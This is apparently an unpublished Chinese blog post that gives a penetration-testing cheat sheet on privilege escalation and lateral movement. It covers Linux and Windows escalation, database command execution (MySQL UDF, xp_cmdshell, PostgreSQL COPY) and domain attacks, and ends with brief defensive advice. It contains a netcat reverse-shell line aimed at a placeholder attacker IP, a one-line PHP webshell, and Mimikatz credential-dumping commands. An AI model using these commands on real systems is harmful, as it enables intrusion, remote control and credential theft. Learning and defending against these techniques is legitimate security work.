---
layout: post
title: 内网提权
subtitle: 内网提权
date: 2025-09-18 11:33
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags:
number headings: 
published: false
---

拿到操作系统和数据库的权限，相当于拿到了内网渗透的关键钥匙。 从操作系统到数据库再到内网横向移动，每一步都需要细致的计划和操作。下面详细讲解如何利用这两个权限提升到内网渗透，并尽量覆盖各种场景。

**第一部分：获取操作系统最高权限**

假设你已经通过某种方式获得了一台服务器的操作系统权限，现在目标是提升到最高权限（Linux 的 root 或 Windows 的 Administrator）。

**Linux 提权**

*   **内核漏洞利用：**
    *   **方法：** 查找与当前内核版本匹配的公开漏洞。 使用工具如 `Linux Exploit Suggester` 或手动搜索 Exploit Database。
    *   **场景：** 古老的 Linux 系统，没有及时打补丁。
    *   **工具：** Metasploit, 编译好的 exp。
    *   **命令示例：**
        ```bash
        # 假设找到一个针对 Linux kernel 2.6 的漏洞
        gcc exploit.c -o exploit
        ./exploit
        ```
*   **SUID/SGID 权限滥用：**
    *   **方法：** 查找具有 SUID 或 SGID 权限的异常文件。 利用这些文件执行本来不应该执行的操作。
    *   **场景：** 开发者错误配置了某些程序的权限。
    *   **命令示例：**
        ```bash
        find / -perm -4000 -o -perm -2000 -print 2>/dev/null
        # 找到 nmap 有 SUID 权限，可以这样提权：
        nmap --interactive
        !sh
        ```
*   **计划任务 (Cron Jobs) 滥用：**
    *   **方法：** 检查 `/etc/crontab` 和 `/etc/cron.d/` 目录，看是否有可以修改或利用的计划任务。
    *   **场景：** 某个脚本以 root 身份运行，但其所有者可被当前用户修改。
    *   **命令示例：**
        ```bash
        # 修改计划任务执行的脚本，植入反弹 shell
        echo "nc -e /bin/bash <攻击者IP> <端口>" >> /path/to/vulnerable/script.sh
        ```
*   **利用 Capabilities：**
    *   **方法:** Linux Capabilities 是一种更细粒度的权限管理机制，可以赋予进程特定的 root 权限，而无需完全的 root 身份。 我们可以查找具有特定 Capabilities 的程序并利用它们。
    *   **命令示例：**
        ```bash
        # 查找具有 cap_setuid capability 的程序
        getcap -r / 2>/dev/null
        ```
*   **Docker 逃逸：**
    *   **方法：** 如果在 Docker 容器中，尝试利用 Docker 的漏洞逃逸到宿主机，从而获取宿主机的权限。
    *   **场景：** 容器配置不当，或者 Docker 版本存在漏洞。

**Windows 提权**

*   **内核漏洞利用：**
    *   **方法：** 类似于 Linux，查找与 Windows 版本匹配的内核漏洞 exp。
    *   **场景：** Windows Server 版本过旧，未及时更新。
    *   **工具：** Metasploit, 编译好的 exp。
*   **不安全的注册表配置：**
    *   **方法：** 检查注册表，查找可能允许普通用户修改的键值，这些键值可能会影响系统行为，导致提权。
    *   **场景：** 某些软件安装时，错误地设置了注册表权限。
    *   **工具：** Regedit
*   **AlwaysInstallElevated：**
    *   **方法：** 如果 `AlwaysInstallElevated` 策略被启用，非特权用户可以以 SYSTEM 权限运行 MSI 文件。
    *   **操作：**
        ```powershell
        # 检查 AlwaysInstallElevated 是否启用
        Get-ItemProperty HKLM:\Software\Policies\Microsoft\Windows\Installer AlwaysInstallElevated

        # 如果启用，创建一个恶意的 MSI 文件并执行
        msiexec /i malicious.msi
        ```
*   **计划任务 (Scheduled Tasks) 滥用：** 类似于 Linux，检查和利用计划任务。
*   **服务配置错误：**
    *   **方法：** 某些 Windows 服务可能配置不当，允许普通用户修改其配置或可执行文件，从而导致提权。
    *   **场景：** 某个服务的可执行文件目录权限过于宽松。
*   **令牌窃取 (Token Stealing)：**
    *   **方法：** 如果当前进程有 `SeDebugPrivilege` 权限（通常需要先通过其他方式提权到高权限用户），可以窃取其他进程的令牌，包括 SYSTEM 进程的令牌。
    *   **工具：** Mimikatz

**第二部分：通过数据库获取系统权限**

如果获得了数据库的管理员权限，可以利用数据库的特性来执行系统命令或上传文件。

*   **MySQL 提权：**
    *   **UDF (User-Defined Functions) 提权：**
        *   **方法：** 创建一个自定义函数，该函数可以执行系统命令。
        *   **条件：** 需要 `FILE` 权限，并且 `secure_file_priv` 选项未限制文件写入位置。
        *   **操作：**
            1.  将包含执行系统命令代码的 DLL 文件上传到服务器。
            2.  创建 UDF 函数指向该 DLL。
            3.  执行 UDF 函数。
        *   **示例：**
            ```sql
            CREATE FUNCTION sys_exec RETURNS STRING SONAME 'udf.dll';
            SELECT sys_exec('whoami');
            ```
    *   **写入 Webshell：**
        *   **方法：** 利用数据库的写入权限，将 Webshell 代码写入到 Web 目录，然后通过 Web 访问执行。
        *   **条件：** 需要知道 Web 目录的绝对路径，并且数据库用户具有写入该目录的权限.
        *   **操作：**
            ```sql
            SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
            ```

*   **SQL Server 提权：**
    *   **xp\_cmdshell：**
        *   **方法：** 启用 `xp_cmdshell` 扩展存储过程，然后使用它执行系统命令。
        *   **条件：** 需要是 `sysadmin` 角色成员。
        *   **操作：**
            ```sql
            -- 启用 xp_cmdshell
            EXEC sp_configure 'show advanced options', 1;
            RECONFIGURE;
            EXEC sp_configure 'xp_cmdshell', 1;
            RECONFIGURE;

            -- 执行命令
            EXEC xp_cmdshell 'whoami';
            ```
    *   **CLR 程序集：**
        *   **方法：** 创建一个 CLR 程序集，该程序集可以执行系统命令。
        *   **条件：** 需要 `UNSAFE ASSEMBLY` 权限。
    *   **MOF (Managed Object Format) 上传：**
        *   **方法：** 上传恶意的 MOF 文件到 `C:\WBEM\MOF` 目录，当系统重启时，MOF 文件会被执行，从而提权。
        *   **条件：** 需要 `sysadmin` 权限。

*   **PostgreSQL 提权：**
    *   **利用 COPY 命令：**
        *   **方法：** 将恶意代码写入文件，需要 `pg_read_server_files` 或 `pg_write_server_files` 权限.
        *   **操作：**
            ```sql
            CREATE TABLE cmd_exec(cmd_output text);
            COPY cmd_exec FROM PROGRAM 'whoami';
            SELECT * FROM cmd_exec;
            ```

**第三部分：利用系统权限进行内网渗透**

获得了操作系统最高权限后，就可以在内网中进行横向移动。

*   **信息收集：**
    *   **网络配置：**
        *   IP 地址、子网掩码、网关、DNS 服务器.
        *   `ipconfig /all` (Windows), `ifconfig` (Linux)
    *   **路由表：**
        *   确定可以到达的网络段 `route print` (Windows), `route -n` (Linux).
    *   **ARP 缓存：**
        *   查看与哪些机器进行过通信 `arp -a` (Windows/Linux).
    *   **进程列表：**
        *   查看正在运行的进程，可能发现有用的信息，如数据库连接字符串等。
    *   **用户列表：**
        *   `net user` (Windows), `cat /etc/passwd` (Linux)
    *   **共享目录：**
        *   `net share` (Windows), `showmount -e` (Linux).
    *   **防火墙规则：**
        *   `netsh advfirewall firewall show rule` (Windows), `iptables -L` (Linux)
    *   **服务列表：**
        *   `services.msc` (Windows), `systemctl list-units --type=service` (Linux)
*   **凭据获取：**
    *   **Mimikatz (Windows)：**
        *   提取内存中的密码、哈希和 Kerberos 票据.
        *   `privilege::debug`
        *   `sekurlsa::logonpasswords`
        *   `sekurlsa::pth` (Pass-the-Hash)
    *   **读取配置文件：**
        *   查找包含密码的配置文件，如 Web 应用的 `config.php`、数据库的 `jdbc.properties` 等。
        *   检查历史命令记录：`~/.bash_history` (Linux)，PowerShell 历史记录 (Windows)。
*   **横向移动：**
    *   **Pass-the-Hash/Pass-the-Ticket：**
        *   利用获取的哈希或 Kerberos 票据登录其他机器.
        *   `psexec.py` (Impacket), Mimikatz
    *   **利用已知漏洞：**
        *   扫描内网其他机器，利用已知的漏洞进行攻击 (如 MS17-010)。
        *   Nmap, Metasploit
    *   **利用 SMB/共享目录：**
        *   如果能访问共享目录，尝试上传恶意文件。
    *   **RDP (Remote Desktop Protocol)：**
        *   如果目标机器启用了 RDP，并且有相应的用户名和密码，可以直接登录。
*   **建立隧道：**
    *   **SSH 隧道：**
        *   如果目标内网机器允许 SSH 连接，可以使用 SSH 隧道将内网端口映射到本地。
        *   `ssh -L <本地端口>:<目标IP>:<目标端口> <用户名>@<跳板机IP>`
    *   **Port Forwarding：**
        *   使用工具如 `lcx` (Windows) 或 `rinetd` (Linux) 进行端口转发。
*   **域渗透 (如果存在域环境)：**
    *   **BloodHound：**
        *   分析域内的权限关系，找到从当前用户到域管理员的提权路径.
        *   收集域信息：`BloodHound.ps1` (PowerShell)
        *   分析数据：BloodHound GUI
    *   **Golden Ticket/Silver Ticket：**
        *   伪造 Kerberos 票据，获取域管理员权限。
    *   **Kerberoasting：**
        *   请求域内服务的 Kerberos 票据，离线破解票据密码。

**一些安全建议**

1.  **密码安全：** 避免使用弱密码，定期更换密码。
2.  **权限管理：** 遵循最小权限原则，只赋予用户完成任务所需的最小权限.
3.  **及时更新：** 及时安装操作系统和应用程序的安全更新。
4.  **安全配置：** 对数据库和 Web 服务器进行安全配置。
5.  **网络分段：** 将网络划分为不同的区域，限制区域之间的访问。
6.  **入侵检测：** 部署入侵检测系统，及时发现和阻止恶意攻击。
7.  **日志监控：** 监控系统日志，及时发现异常行为。

通过以上步骤，理论上可以从一个操作系统权限，逐步渗透到整个内网。
